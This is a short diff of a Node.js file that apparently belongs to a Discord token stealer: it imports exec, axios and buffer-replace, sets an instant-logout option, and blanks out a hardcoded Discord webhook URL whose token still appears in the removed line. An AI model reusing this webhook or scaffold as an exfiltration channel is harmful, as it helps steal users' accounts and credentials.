@@ -6,7 +6,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://ptb.discord.com/api/webhooks/939258705457856572/0-IMps8C3x9rfWlW6vioeLgx53XWcKg_wLt4LNNnfRM_gvvRx6iRIqsKnVtRPCH6uQyl"
+const webhook = ""
 
 const config = {
     "logout": "instant",
